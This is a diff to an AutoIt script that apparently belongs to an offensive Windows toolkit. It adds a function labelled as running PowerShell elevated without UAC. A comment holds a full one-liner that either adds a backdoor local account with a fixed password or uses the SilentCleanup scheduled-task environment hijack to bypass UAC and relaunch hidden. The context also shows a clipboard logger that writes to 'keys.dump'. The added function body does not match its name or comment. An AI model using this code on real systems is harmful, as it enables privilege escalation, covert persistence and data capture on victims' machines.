@@ -19,6 +19,16 @@ Func RunElevated($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";')
    RunWait($buffer00);
 EndFunc
 
+;Run powershell command with elevated permissions WITHOUT UAC
+;WORK IN Progress;
+;if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {net user martino testP4ss /add} else {$registryPath = "HKCU:\Environment";$Name = "windir";$Value = "powershell -ep bypass -w h $PSCommandPath;#";Set-ItemProperty -Path $registryPath -Name $name -Value $Value;schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null;Remove-ItemProperty -Path $registryPath -Name $name}
+Func RunElevatedNoUAC($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";')
+   $buffer01 = "powershell.exe -Command ";
+   $buffer02 = '"Start-Process powershell -Verb runAs ' & "'";
+   $buffer00 = $buffer01 & $buffer02 & $buffer & "'" & '"';
+   RunWait($buffer00);
+EndFunc
+
 ;Log to file the data stored in the clipboard
 Func clipboard2Log($timeOut = 10, $pathLog = @TempDir & "\keys.dump")
    $buffer=""
